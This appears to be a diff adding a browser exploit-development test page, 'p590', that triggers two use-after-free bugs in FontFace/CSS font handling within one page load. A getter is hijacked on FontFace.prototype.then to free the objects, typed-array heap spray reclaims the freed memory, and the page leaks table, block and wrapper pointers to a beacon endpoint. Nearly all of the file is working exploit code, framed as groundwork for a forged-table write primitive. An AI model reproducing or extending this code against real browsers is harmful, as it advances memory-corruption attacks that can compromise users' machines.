@@ -1,0 +1,172 @@
+<!--
+  p590: Two-UAF-in-one-page test.
+
+  Prerequisite for addClient-write-only exploitation: can we trigger two
+  independent FontFace UAFs within a single page load?
+
+  Stage 0: UAF-1 on family 'sa' (CSS) via pa.loaded resolution.
+           null +0x58 → engine allocates fresh table → leak T1, B1.
+  Stage 2: UAF-2 on family 'sb' (CSS) via pb.loaded resolution.
+           null +0x58 → engine allocates fresh table → leak T2, B2.
+
+  Mechanism: each pa/pb.loaded Promise resolves with the FontFace;
+  Promise resolution checks for .then on FontFace.prototype (our getter).
+  Getter deletes the CSS @font-face style → cascade rebuild frees the
+  CSSFontFace → spray reclaims → continuation writes into spray.
+
+  Two separate CSS families in two <style> elements, two JS FontFaces,
+  two load() calls, two spray arrays.
+
+  Verdict:
+    TWO_UAF=YES  → both fired, addClient forged-table path viable
+    TWO_UAF=NO   → only one hit, need cold-boot determinism or alternative
+    UAF1-NOHIT   → first UAF failed (regression)
+    UAF2-NOTRIG  → getter didn't fire for second cycle
+
+  Expected beacons:
+    G            = start
+    F1           = first font freed inside getter
+    S1-<n>       = first spray done (n buffers)
+    L1-OK|FAIL   = first load() promise resolved/rejected
+    AH<i>,rc=<d> = UAF-1 hit at lane i
+    AT=<hex>     = UAF-1 table pointer
+    AB=<hex>     = UAF-1 block base (T-0x60)
+    AW=<hex>     = UAF-1 wrapper pointer
+    F2           = second font freed inside getter
+    S2-<n>       = second spray done
+    L2-OK|FAIL   = second load() promise
+    BH<i>,rc=<d> = UAF-2 hit at lane i
+    BT=<hex>     = UAF-2 table pointer
+    BB=<hex>     = UAF-2 block base
+    BW=<hex>     = UAF-2 wrapper pointer
+    TWO_UAF=YES|NO = final verdict
+    L1NEW=<n>    = extra hits in lane1 after UAF-2 (cross-contamination)
+    ALIVE / ALIVE2
+
+  CRASH_CLASS: HIGH
+-->
+<!DOCTYPE html><html><head><meta charset="utf-8"><title>p590</title>
+<style id="v1">@font-face{font-family:sa;src:local(Arial);unicode-range:U+0042}</style>
+<style id="v2">@font-face{font-family:sb;src:local(Helvetica);unicode-range:U+0044}</style>
+<script>
+function b(m){try{var x=new XMLHttpRequest();x.open('GET','/beacon/'+m,false);x.send();}catch(e){}}
+function rQ(v,o){var s='';for(var j=7;j>=0;j--)s+=('0'+v[o+j].toString(16)).slice(-2);return s;}
+function rD(v,o){return(v[o]|0)+((v[o+1]|0)<<8)+((v[o+2]|0)<<16)+((v[o+3]|0)*0x1000000);}
+function wD(v,o,x){v[o]=x&0xFF;v[o+1]=(x>>>8)&0xFF;v[o+2]=(x>>>16)&0xFF;v[o+3]=(x>>>24)&0xFF;}
+function wQ(v,o,hi,lo){wD(v,o,lo);wD(v,o+4,hi);}
+
+var stage=0,lane1=null,lane2=null,hit1idx=-1;
+
+function mkSpray(tag,marker){
+  var lane=[];
+  for(var i=0;i<2048;i++)lane.push(new Uint8Array(new ArrayBuffer(192)));
+  for(var j=0;j<lane.length;j++){
+    var v=lane[j];
+    for(var k=0;k<192;k++)v[k]=0xAA;
+    wD(v,0x00,2);
+    wQ(v,0x58,0,0);
+    wD(v,0x60,0);
+    wD(v,0x64,0xFFFFFFFF);
+    wQ(v,0x68,0,0);
+    v[0x82]=3;
+    v[0x85]=0xAA;
+    v[0x04]=marker;
+  }
+  b(tag+lane.length);
+  return lane;
+}
+
+function scanLane(lane,tag){
+  if(!lane)return -1;
+  for(var i=0;i<lane.length;i++){
+    var v=lane[i],rc=rD(v,0);
+    var t0=v[0x58]|v[0x59]|v[0x5A]|v[0x5B]|v[0x5C]|v[0x5D]|v[0x5E]|v[0x5F];
+    var w0=v[0x68]|v[0x69]|v[0x6A]|v[0x6B]|v[0x6C]|v[0x6D]|v[0x6E]|v[0x6F];
+    if(rc!==2||t0||w0){
+      b(tag+'H'+i+',rc='+rc);
+      var t58=rQ(v,0x58);
+      b(tag+'T='+t58);
+      if(t58!=='0000000000000000'){
+        var tlo=rD(v,0x58),thi=rD(v,0x5C);
+        var blo=tlo-0x60,bhi=thi;
+        if(blo<0){blo+=0x100000000;bhi-=1;}
+        b(tag+'B='+('00000000'+bhi.toString(16)).slice(-8)+('00000000'+blo.toString(16)).slice(-8));
+      }
+      b(tag+'W='+rQ(v,0x68));
+      b(tag+'ST='+v[0x82]+',MP='+v[0x85]+',TAG='+v[0x04]);
+      return i;
+    }
+  }
+  b(tag+'MISS');
+  return -1;
+}
+
+function countHits(lane){
+  if(!lane)return 0;
+  var n=0;
+  for(var i=0;i<lane.length;i++){
+    var rc=rD(lane[i],0);
+    var t0=lane[i][0x58]|lane[i][0x59]|lane[i][0x5A]|lane[i][0x5B]|lane[i][0x5C]|lane[i][0x5D]|lane[i][0x5E]|lane[i][0x5F];
+    if(rc!==2||t0)n++;
+  }
+  return n;
+}
+
+Object.defineProperty(FontFace.prototype,'then',{configurable:true,
+get:function(){
+  if(stage===0){stage=1;
+    document.getElementById('v1').remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    b('F1');
+    lane1=mkSpray('S1-',0x11);
+    return;}
+  if(stage===2){stage=3;
+    document.getElementById('v2').remove();
+    try{document.fonts.delete(this);}catch(e){}
+    document.body.offsetHeight;
+    b('F2');
+    lane2=mkSpray('S2-',0x22);
+    return;}
+  return;
+},set:function(){}});
+
+function main(){
+b('G');
+
+var pa=new FontFace('pa','local(Helvetica)',{unicodeRange:'U+0041'});
+document.fonts.add(pa);void pa.loaded;
+document.fonts.load('1em pa, sa','AB').then(function(){b('L1-OK');},function(){b('L1-FAIL');});
+
+setTimeout(function(){
+  hit1idx=scanLane(lane1,'A');
+  if(hit1idx<0){b('UAF1-NOHIT');return;}
+  var n1=countHits(lane1);
+  b('L1HITS='+n1);
+
+  stage=2;
+  var pb=new FontFace('pb','local(Arial)',{unicodeRange:'U+0043'});
+  document.fonts.add(pb);void pb.loaded;
+  document.fonts.load('1em pb, sb','CD').then(function(){b('L2-OK');},function(){b('L2-FAIL');});
+},100);
+
+setTimeout(function(){
+  if(stage<2){b('UAF2-NOTRIG,stage='+stage);return;}
+  if(!lane2){b('UAF2-NOSPRAY,stage='+stage);return;}
+  var hit2=scanLane(lane2,'B');
+  if(hit2>=0){
+    var n2=countHits(lane2);
+    b('L2HITS='+n2);
+    var n1after=countHits(lane1);
+    b('L1NEW='+(n1after-(hit1idx>=0?1:0)));
+    b('TWO_UAF=YES');
+  } else {
+    b('TWO_UAF=NO');
+  }
+},500);
+
+setTimeout(function(){b('ALIVE');},2000);
+setTimeout(function(){b('ALIVE2');},5000);
+}
+setTimeout(main,0);
+</script></head><body>p590</body></html>
